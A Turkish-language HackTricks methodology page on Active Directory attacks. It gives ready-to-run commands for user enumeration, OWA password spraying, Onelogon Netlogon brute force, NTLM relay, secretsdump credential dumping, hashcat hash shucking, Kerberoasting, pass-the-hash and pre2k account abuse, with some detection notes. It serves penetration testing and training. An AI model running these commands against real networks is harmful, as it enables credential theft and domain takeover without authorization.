# Active Directory Metodolojisi

{{#include ../../banners/hacktricks-training.md}}

## Temel genel bakış

**Active Directory**, **ağ yöneticilerinin** bir ağ içindeki **etki alanlarını**, **kullanıcıları** ve **nesneleri** verimli bir şekilde oluşturup yönetmesini sağlayan temel bir teknolojidir. Ölçeklenebilir olacak şekilde tasarlanmıştır; çok sayıda kullanıcının yönetilebilir **gruplar** ve **alt gruplar** halinde düzenlenmesini sağlarken farklı düzeylerdeki **erişim haklarını** da kontrol eder.

**Active Directory** yapısı üç temel katmandan oluşur: **etki alanları**, **ağaçlar** ve **ormanlar**. Bir **etki alanı**, ortak bir veritabanını paylaşan **kullanıcılar** veya **cihazlar** gibi nesnelerden oluşur. **Ağaçlar**, ortak bir yapıyla birbirine bağlanan etki alanı gruplarıdır. **Orman** ise **güven ilişkileri** aracılığıyla birbirine bağlanan birden fazla ağacın oluşturduğu koleksiyondur ve organizasyon yapısının en üst katmanını temsil eder. Bu düzeylerin her birinde belirli **erişim** ve **iletişim hakları** tanımlanabilir.

**Active Directory** içindeki temel kavramlar şunlardır:

1. **Dizin** – Active Directory nesnelerine ilişkin tüm bilgileri barındırır.
2. **Nesne** – Dizin içindeki **kullanıcılar**, **gruplar** veya **paylaşılan klasörler** gibi varlıkları ifade eder.
3. **Etki alanı** – Dizin nesneleri için bir kapsayıcı görevi görür. Bir **orman** içinde birden fazla etki alanı bulunabilir ve her biri kendi nesne koleksiyonunu tutar.
4. **Ağaç** – Ortak bir kök etki alanını paylaşan etki alanlarından oluşan bir gruptur.
5. **Orman** – Active Directory’deki organizasyon yapısının en üst katmanıdır; aralarında **güven ilişkileri** bulunan birden fazla ağaçtan oluşur.

**Active Directory Domain Services (AD DS)**, ağ içinde merkezi yönetim ve iletişim için kritik olan çeşitli hizmetleri kapsar. Bu hizmetler şunlardır:

1. **Etki Alanı Hizmetleri** – Verileri merkezi olarak depolar ve **kullanıcılar** ile **etki alanları** arasındaki etkileşimleri yönetir; **kimlik doğrulama** ve **arama** işlevleri de buna dahildir.
2. **Sertifika Hizmetleri** – Güvenli **dijital sertifikaların** oluşturulmasını, dağıtılmasını ve yönetilmesini sağlar.
3. **Lightweight Directory Services** – **LDAP protokolü** üzerinden dizin kullanan uygulamaları destekler.
4. **Directory Federation Services** – Kullanıcıların tek bir oturumda birden fazla web uygulamasında kimlik doğrulaması yapabilmesi için **single-sign-on** özellikleri sağlar.
5. **Hak Yönetimi** – Telif hakkıyla korunan materyallerin yetkisiz dağıtımını ve kullanımını denetleyerek korunmasına yardımcı olur.
6. **DNS Service** – **Etki alanı adlarının** çözümlenmesi için kritik öneme sahiptir.

Daha ayrıntılı açıklama için şuraya bakın: [**TechTerms - Active Directory Tanımı**](https://techterms.com/definition/active_directory)

### **Kerberos Kimlik Doğrulaması**

Bir **AD’ye saldırmayı** öğrenmek için **Kerberos kimlik doğrulama sürecini** çok iyi **anlamanız** gerekir.\
[**Nasıl çalıştığını henüz bilmiyorsanız bu sayfayı okuyun.**](kerberos-authentication.md)

## Hile Sayfası

Bir AD’yi numaralandırmak veya istismar etmek için çalıştırabileceğiniz komutlara hızlıca göz atmak üzere [https://wadcoms.github.io/](https://wadcoms.github.io) adresini kullanabilirsiniz.

> [!WARNING]
> Kerberos iletişimi genellikle istemcinin doğru SPN için bilet alabilmesi amacıyla **tam etki alanı adını (FQDN)** gerektirir. Bir makineye IP adresiyle erişmek çoğunlukla Kerberos yerine NTLM kullanımına yol açar.

## Active Directory keşfi (Kimlik bilgisi/oturum yok)

Bir AD ortamına erişiminiz varsa ancak herhangi bir kimlik bilginiz/oturumunuz yoksa şunları yapabilirsiniz:

- **Ağı pentest edin:**
  - Ağı tarayın, makineleri ve açık portları bulun; ardından **güvenlik açıklarını istismar etmeye** veya bu makinelerden **kimlik bilgilerini çıkarmaya** çalışın (örneğin, [yazıcılar oldukça ilgi çekici hedefler olabilir](ad-information-in-printers.md)).
  - DNS’yi numaralandırmak; web, yazıcı, paylaşım, vpn, medya vb. gibi etki alanındaki önemli sunucular hakkında bilgi sağlayabilir.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Bunun nasıl yapılacağı hakkında daha fazla bilgi için Genel [**Pentest Metodolojisi**](../../generic-methodologies-and-resources/pentesting-methodology.md) sayfasına göz atın.
- **smb hizmetlerinde null ve Guest erişimini kontrol edin** (modern Windows sürümlerinde bu yöntem işe yaramaz):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Bir SMB sunucusunu numaralandırmaya ilişkin daha ayrıntılı bir rehbere buradan ulaşabilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP’yi numaralandırın**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP’yi numaralandırmaya ilişkin daha ayrıntılı bir rehbere buradan ulaşabilirsiniz (**anonim erişime** özellikle dikkat edin):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Ağı zehirleyin**
  - [**Responder ile servisleri taklit ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) kimlik bilgilerini toplayın.
  - [**Relay attack’i kötüye kullanarak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ana sisteme erişin.
  - [**evil-S ile sahte UPnP servislerini açığa çıkararak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) kimlik bilgilerini toplayın.
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Şirket içi belgelerden, sosyal medyadan, etki alanı ortamlarındaki servislerden (özellikle web servislerinden) ve herkese açık kaynaklardan kullanıcı adlarını/adları çıkarın.
  - Şirket çalışanlarının tam adlarını bulursanız farklı AD **kullanıcı adı biçimlerini deneyebilirsiniz (**[**burayı okuyun**](https://activedirectorypro.com/active-directory-user-naming-convention/)). En yaygın biçimler şunlardır: _NameSurname_, _Name.Surname_, _NamSur_ (her birinden 3 harf), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _rastgele harf ve 3 rastgele sayı_ (abc123).
  - Araçlar:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Kullanıcı numaralandırma

- **Anonim SMB/LDAP numaralandırması:** [**SMB pentest**](../../network-services-pentesting/pentesting-smb/index.html) ve [**LDAP pentest**](../../network-services-pentesting/pentesting-ldap.md) sayfalarına bakın.
- **Kerbrute numaralandırması**: **Geçersiz bir kullanıcı adı istendiğinde** sunucu, _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos hata koduyla** yanıt verir. Bu sayede kullanıcı adının geçersiz olduğunu belirleyebiliriz. **Geçerli kullanıcı adları** için sunucu ya **AS-REP** yanıtında **TGT** döndürür ya da _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatasını verir; bu, kullanıcının ön kimlik doğrulaması yapması gerektiğini belirtir.
- **MS-NRPC’ye kimlik doğrulamasız erişim**: Etki alanı denetleyicilerindeki MS-NRPC (Netlogon) arayüzüne karşı auth-level = 1 (Kimlik doğrulama yok) kullanılır. Bu yöntemde, MS-NRPC arayüzüne bağlandıktan sonra `DsrGetDcNameEx2` işlevi çağrılarak herhangi bir kimlik bilgisi olmadan kullanıcının veya bilgisayarın var olup olmadığı kontrol edilir. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) aracı bu tür numaralandırmayı uygular. Araştırmaya [buradan](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> ulaşabilirsiniz.

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

Ağda bu sunuculardan birini bulduysanız, buna karşı **user enumeration** da gerçekleştirebilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Kullanıcı adları listelerini [**bu github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) içinde ve bu repoda ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) bulabilirsiniz.
>
> Ancak, bundan önce gerçekleştirmiş olmanız gereken recon adımında **şirkette çalışan kişilerin adlarını** edinmiş olmalısınız. Ad ve soyad bilgileriyle, olası geçerli kullanıcı adları üretmek için [**namemash.py**](https://gist.github.com/superkojiman/11076951) scriptini kullanabilirsiniz.

### Netlogon güvenlik açığı bulunan kanal izin listesi istismar yöntemi (Onelogon)

**Zerologon**, DC üzerinde yamalanmış olsa bile açıkça izin listesine eklenmiş hesaplar **eski/güvenlik açığı bulunan Netlogon güvenli kanal davranışına** hâlâ maruz kalabilir. Riskli yapılandırma, GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** veya eşleşen kayıt defteri değeri **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**'tir.

Bu değer bir **SDDL güvenlik tanımlayıcısıdır** ([Security Descriptors](security-descriptors.md) bölümüne bakın). DACL içinde ilgili ACE ile izin verilen tüm hesaplar veya gruplar hedef alınabilir. Örneğin, `O:BAG:BAD:(A;;RC;;;WD)` ifadesi etkili biçimde **Everyone** grubunu izin listesine ekler.

Uygulamada izlenecek adımlar:

1. **SYSVOL/GPO** ile **canlı DC kayıt defterini** kontrol ederek izin listesine eklenmiş sorumluları belirleyin.
2. SDDL'de bulunan SID'leri gerçek AD kullanıcılarına/bilgisayarlarına eşleyin ve **DC makine hesaplarına**, **trust hesaplarına** ve diğer ayrıcalıklı makinelere öncelik verin.
3. İzin listesine eklenmiş hesap olarak **MS-NRPC / Netlogon kimlik doğrulamasını** tekrar tekrar deneyin.
4. Başarılı bir tahminin ardından, hedef hesabın parolasını sıfırlamak için **Netlogon parola belirleme** özelliğini istismar edin (kamuya açık PoC parolayı boş bir dize olarak ayarlar).<sup>[[9]](#references)[[10]](#references)</sup>

Kamuya açık artifact'tan hızlı ön değerlendirme / lab örnekleri:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notlar:

- **scanner**, etkin izin listesinin **SYSVOL**'da, **registry**'de veya her ikisinde bulunabilmesi nedeniyle kullanışlıdır.
- Exploit yolu önemlidir; çünkü savunmasız bir hesap belirlendikten sonra **Domain Admin privileges** gerektirmez.
- `DC$` gibi bir **Domain Controller machine account**'un ele geçirilmesi özellikle tehlikelidir; bu hesabın parolasını sıfırlamak, daha geniş kapsamlı **AD takeover** yollarını doğrudan mümkün kılabilir.
- **Brute-force** uygulanabilirliği moda bağlıdır: herkese açık artifact, meet-in-the-middle yaklaşımını, başka bir computer account mevcut olduğunda **24-bit** brute force'u ve daha yavaş **32-bit** varyantları açıklar.

Tespit / hardening notları:

- İzin listesi politikasını denetleyin ve geçici, açıkça gerekli uyumluluk istisnaları dışındaki her şeyi kaldırın.
- Savunmasız Netlogon bağlantılarının engellendiğini, tespit edildiğini veya politika kapsamında açıkça izin verildiğini yakalamak için DC **System** olayları **5827/5828/5829/5830/5831**'i izleyin.
- Eski bağımlılık kaldırılana kadar `VulnerableChannelAllowList` içindeki hesapları **high-risk** olarak değerlendirin.

### Bir veya birkaç kullanıcı adını bilmek

Tamam, geçerli bir kullanıcı adınız olduğunu biliyorsunuz ama parolanız yok... O zaman şunları deneyin:

- [**ASREPRoast**](asreproast.md): Bir kullanıcıda _DONT_REQ_PREAUTH_ attribute'u **yoksa**, o kullanıcı için parolanın türetilmiş haliyle şifrelenmiş veriler içeren bir **AS_REP mesajı isteyebilirsiniz**.
- [**Password Spraying**](password-spraying.md): Bulduğunuz her kullanıcı için en **yaygın parolaları** deneyelim; belki bir kullanıcı zayıf bir parola kullanıyordur (password policy'yi göz önünde bulundurun!).
  - Kullanıcıların mail sunucularına erişmeyi denemek için **OWA sunucularına spray** de uygulayabileceğinizi unutmayın.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ağdaki bazı protokolleri **poisoning** ederek kırabileceğiniz challenge **hashes** **elde edebilirsiniz**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration; kullanıcı adları, e-posta tanımlayıcıları ve adlandırma kalıpları, aday host'lar ve kimlik doğrulamaya zorlanabilecek servisler sağlar. Bu bağlamı, uygulanabilir NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ve AD ortamına yönelik olası yolları belirlemek için kullanın.

### NetExec workspace odaklı keşif ve relay duruşu kontrolleri

- Her engagement için AD keşif durumunu korumak üzere **`nxcdb` workspaces** kullanın: `workspace create <name>`, `~/.nxc/workspaces/<name>` altında protokol başına SQLite DB'leri (smb/mssql/winrm/ldap/etc) oluşturur. `proto smb|mssql|winrm` ile görünümler arasında geçiş yapın ve toplanan sırları `creds` ile listeleyin. İşiniz bittiğinde hassas verileri manuel olarak silin: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** ile hızlı subnet discovery; **domain**, **OS build**, **SMB signing requirements** ve **Null Auth** bilgilerini ortaya çıkarır. `(signing:False)` gösteren üyeler **relay-prone**'dur; DC'ler ise genellikle signing gerektirir.
- Hedeflemeyi kolaylaştırmak için NetExec çıktısından doğrudan **/etc/hosts** içinde hostname'ler oluşturun:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- İmzalama nedeniyle **SMB relay’in DC’ye yapılması engellense** bile, **LDAP** yapılandırmasını probe edin: `netexec ldap <dc>`, `(signing:None)` / zayıf channel binding durumunu gösterir. SMB signing zorunlu olan ancak LDAP signing devre dışı bırakılmış bir DC, **SPN-less RBCD** gibi kötüye kullanım senaryoları için hâlâ uygun bir **relay-to-LDAP** hedefidir.

### İstemci tarafı yazıcı kimlik bilgisi leak'leri → toplu etki alanı kimlik bilgisi doğrulaması

- Yazıcı/web arayüzleri bazen **maskelenmiş yönetici parolalarını HTML içine gömer**. Kaynağı/devtools'u görüntülemek parolanın açık metnini ortaya çıkarabilir (ör. `<input value="<password>">`) ve Basic-auth ile tarama/yazdırma depolarına erişim sağlayabilir.
- Alınan yazdırma işleri, kullanıcı başına parola içeren **açık metinli onboarding belgeleri** barındırabilir. Test ederken eşleşmeleri bir arada tutun:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM Kimlik Bilgilerini Çalma

**null veya guest user** ile **diğer PC’lere veya paylaşımlara erişebiliyorsanız**, **dosyalar** (SCF file gibi) **yerleştirebilirsiniz**. Bu dosyalara bir şekilde erişilirse, size karşı bir NTLM kimlik doğrulamasını **tetikleyebilir** ve böylece **NTLM challenge’ı** **çalabilirsiniz**:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**, elinizdeki her NT hash’i, anahtar materyali doğrudan NT hash’ten türetilen diğer, daha yavaş formatlar için olası bir parola olarak kullanır. Kerberos RC4 ticket’larında, NetNTLM challenge’larında veya önbelleğe alınmış kimlik bilgilerinde uzun parolaları brute-force etmek yerine, NT hash’lerini Hashcat’in NT-candidate modlarına vererek parolanın yeniden kullanımını, açık metni hiç öğrenmeden doğrulamasını sağlayabilirsiniz. Bu yöntem, binlerce güncel ve geçmiş NT hash’i toplayabileceğiniz bir domain compromise sonrasında özellikle etkilidir.<sup>[[5]](#references)</sup>

Şu durumlarda shucking kullanın:

- DCSync, SAM/SECURITY dump’ları veya credential vault’larından elde ettiğiniz bir NT corpus’unuz varsa ve başka domain/forest’larda yeniden kullanım olup olmadığını test etmeniz gerekiyorsa.
- RC4 tabanlı Kerberos materyali (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM yanıtları veya DCC/DCC2 blob’ları yakaladıysanız.
- Uzun ve kırılamayan parolaların yeniden kullanımını hızla kanıtlamak ve hemen Pass-the-Hash ile ilerlemek istiyorsanız.

Bu teknik, anahtarları NT hash olmayan şifreleme türlerinde çalışmaz (ör. Kerberos etype 17/18 AES). Bir domain yalnızca AES kullanımını zorluyorsa, normal parola modlarına dönmeniz gerekir.

#### NT hash corpus’u oluşturma

- **DCSync/NTDS** – Mümkün olan en geniş NT hash kümesini (ve önceki değerlerini) almak için `secretsdump.py`’yi history seçeneğiyle kullanın:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Geçmiş girdileri aday havuzunu önemli ölçüde genişletir; çünkü Microsoft hesap başına en fazla 24 önceki hash'i saklayabilir. NTDS secrets elde etmenin başka yolları için bkz.:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dökümleri** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`), yerel SAM/SECURITY verilerini ve önbelleğe alınmış domain logon bilgilerini (DCC/DCC2) çıkarır. Yinelenenleri kaldırın ve bu hash'leri aynı `nt_candidates.txt` listesine ekleyin.
- **Metadata'yı takip edin** – Her hash'i üreten kullanıcı adını/domain'i kaydedin (wordlist yalnızca hex içerse bile). Hash'ler eşleştiğinde, Hashcat kazanan adayı yazdırır yazdırmaz hangi principal'ın parolasını yeniden kullandığını anlarsınız.
- Shucking sırasında örtüşme olasılığını en üst düzeye çıkarmak için aynı forest'tan veya güvenilen bir forest'tan gelen adayları tercih edin.

#### Hashcat NT-candidate modları

| Hash Türü                                | Parola Modu | NT-Candidate Modu |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notlar:

- NT-candidate girdileri **ham 32 hex NT hash'i olarak kalmalıdır**. Rule engine'leri devre dışı bırakın (`-r` kullanmayın, hybrid mode kullanmayın); çünkü değiştirme işlemi aday anahtar materyalini bozar.
- Bu modlar doğası gereği daha hızlı değildir; ancak NTLM keyspace'i (M3 Max'te yaklaşık 30.000 MH/s), Kerberos RC4'ten (yaklaşık 300 MH/s) yaklaşık 100 kat daha hızlıdır. Seçilmiş bir NT listesini test etmek, yavaş formatta tüm parola alanını taramaktan çok daha ucuzdur.
- Her zaman **en yeni Hashcat build'ini** kullanın (`git clone https://github.com/hashcat/hashcat && make install`); çünkü 31500/31600/35300/35400 modları yakın zamanda eklendi.<sup>[[7]](#references)</sup>
- Şu anda AS-REQ Pre-Auth için NT mode yoktur ve AES etype'ları (19600/19700), anahtarları ham NT hash'lerinden değil UTF-16LE parolalardan PBKDF2 ile türetildiği için açık metin parolayı gerektirir.

#### Örnek – Kerberoast RC4 (mode 35300)

1. Düşük yetkili bir kullanıcıyla hedef SPN için RC4 TGS yakalayın (ayrıntılar için Kerberoast sayfasına bakın):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Ticket'ı NT listenizle shuck edin:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat, RC4 key'ini her NT adayı için türetir ve `$krb5tgs$23$...` blob'unu doğrular. Eşleşme, servis hesabının mevcut NT hash'lerinizden birini kullandığını doğrular.

3. Hemen PtH ile pivot yapın:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Gerekirse daha sonra `hashcat -m 1000 <matched_hash> wordlists/` ile plaintext'i kurtarabilirsiniz.

#### Örnek – Önbelleğe alınmış kimlik bilgileri (mode 31600)

1. Ele geçirilmiş bir workstation'dan önbelleğe alınmış logon'ları dökün:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. İlgi çekici domain kullanıcısının DCC2 satırını `dcc2_highpriv.txt` dosyasına kopyalayın ve shuck edin:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Başarılı bir eşleşme, listenizde zaten bilinen NT hash’ini verir ve önbelleğe alınmış kullanıcının parolasını yeniden kullandığını kanıtlar. Hash’i doğrudan PtH için kullanın (`nxc smb <dc_ip> -u highpriv -H <hash>`) veya parolayı bulmak için hızlı NTLM modunda brute-force uygulayın.

Aynı iş akışı NetNTLM challenge-response değerleri (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Bir eşleşme belirlendiğinde relay, SMB/WMI/WinRM PtH başlatabilir veya NT hash’ini maskeler/kurallarla çevrimdışı olarak yeniden crack edebilirsiniz.



## Kimlik bilgileri/oturumla Active Directory’yi numaralandırma

Bu aşama için geçerli bir domain hesabının **kimlik bilgilerini veya oturumunu ele geçirmiş olmanız gerekir.** Geçerli kimlik bilgileriniz veya bir domain kullanıcısı olarak shell’iniz varsa, **daha önce belirtilen seçeneklerin diğer kullanıcıları ele geçirmek için hâlâ kullanılabileceğini unutmayın**.

Kimliği doğrulanmış numaralandırmaya başlamadan önce **Kerberos double-hop sorununu** anlayın.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Numaralandırma

Bir hesabı ele geçirmek, **domain’i değerlendirmeye yönelik önemli bir adımdır**; çünkü kimliği doğrulanmış **Active Directory numaralandırmasını** mümkün kılar:

[**ASREPRoast**](asreproast.md) ile ilgili olarak artık güvenlik açığı bulunabilecek tüm kullanıcıları bulabilir; [**Password Spraying**](password-spraying.md) ile ilgili olarak da **tüm kullanıcı adlarının listesini** çıkarıp ele geçirilen hesabın parolasını, boş parolaları ve umut vadeden yeni parolaları deneyebilirsiniz.

- Temel recon için [**CMD kullanabilirsiniz**](../basic-cmd-for-pentesters.md#domain-info)
- Daha gizli olması için [**recon amaçlı powershell de kullanabilirsiniz**](../basic-powershell-for-pentesters/index.html)
- Daha ayrıntılı bilgi çıkarmak için [**powerview de kullanabilirsiniz**](../basic-powershell-for-pentesters/powerview.md)
- Active Directory’de recon için bir diğer harika araç da [**BloodHound**](bloodhound.md)’dur. **Çok gizli değildir** (kullandığınız collection yöntemlerine bağlı olarak), ancak **bunu önemsemiyorsanız** kesinlikle denemelisiniz. Kullanıcıların nerelerde RDP yapabildiğini, diğer gruplara giden yolları vb. bulun.
  - **Diğer otomatik AD numaralandırma araçları:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- İlginç bilgiler içerebilecek [**AD’nin DNS kayıtlarını**](ad-dns-records.md) inceleyin.
- Dizini numaralandırmak için kullanabileceğiniz **GUI’li bir araç**, **SysInternal** Suite içindeki **AdExplorer.exe**’dir.
- LDAP veritabanında kimlik bilgileri için _userPassword_ ve _unixUserPassword_ alanlarını, hatta kullanıcıların _description_ ve _info_ notlarını aramak için **ldapsearch** kullanabilirsiniz. _info_ alanındaki etiketsiz, parolaya benzeyen bir dize yalnızca adaydır: amacını ve geçerliliğini ayrıca doğrulayın ve rutin numaralandırma çıktılarında not içeriklerini göstermeyin. Diğer yöntemler için PayloadsAllTheThings’teki [AD User comment içindeki parola](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) sayfasına bakın.
- Yetkiniz varsa, `\\<dc>\NETLOGON` veya `\\<dc>\SYSVOL\<domain>\scripts` altındaki **erişilebilir** domain oturum açma ve sürücü eşleme script’lerini inceleyin. [Microsoft belgelerinde](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) NETLOGON share’inin script dizini işlevi açıklanmıştır. Önce adları listeleyin, ardından yalnızca boyut sınırları içindeki ilgili ve okunabilir script’leri inceleyin; tüm share’i dökmeyin veya rutin numaralandırma sırasında kimlik bilgisi değerlerini ekrana yazdırmayın. [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) PowerShell çağrısı, script’te düz metin olarak saklanan bir parolayı **korumaz**. Tek başına bu çağrı, bir sırrın sabit kodlandığını kanıtlamaz: gerçek girdisini izleyin, ardından hesabı, kimlik bilgilerinin geçerliliğini ve ayrıcalıkları ayrıca doğrulayın. Domain script’ini incelemek, yerel host numaralandırmasından ayrı bir uzak share incelemesidir.
- **Linux** kullanıyorsanız, domain’i [**pywerview**](https://github.com/the-useless-one/pywerview) ile de numaralandırabilirsiniz.
- Şu otomatik araçları da deneyebilirsiniz:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Tüm domain kullanıcılarını çıkarma**

  Windows’tan tüm domain kullanıcı adlarını almak çok kolaydır (`net user /domain` ,`Get-DomainUser` veya `wmic useraccount get name,sid`). Linux’ta şunları kullanabilirsiniz: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>`

> Bu Numaralandırma bölümü kısa görünse bile, tüm sürecin en önemli kısmıdır. Bağlantıları (özellikle cmd, powershell, powerview ve BloodHound olanları) açın; bir domain’i nasıl numaralandıracağınızı öğrenin ve kendinizi rahat hissedene kadar pratik yapın. Bir değerlendirme sırasında DA’ya ulaşmanın yolunu bulmak veya yapılabilecek hiçbir şey olmadığına karar vermek için bu aşama belirleyici olacaktır.

### Tahmin edilebilir, önceden oluşturulmuş computer hesapları -> gMSA parola erişimi

Eski join işlemleri için hazırlanan computer hesaplarında tahmin edilebilir bir başlangıç parolası kalabilir. NetExec’in `pre2k` modülü, karakteristik `userAccountControl` değeri olan `4128`’i (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) belirler ve sondaki `$` işareti olmadan, küçük harfe çevrilmiş computer adının ilk 14 karakterini kullanarak Kerberos TGT almaya çalışır. Bu UAC değerini, **Pre-Windows 2000 Compatible Access** üyeliğinin tek başına parolanın zayıf olduğunu kanıtladığını varsaymak yerine, adayları seçmek için kullanın.<sup>[[18]](#references)[[20]](#references)</sup>

Adayları test etmek ve başarılı TGT’leri kaydetmek için kimliği doğrulanmış LDAP numaralandırması kullanın. `ALL=True`, test kapsamını varsayılan `4128` filtresindeki nesnelerin ötesine genişletir.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

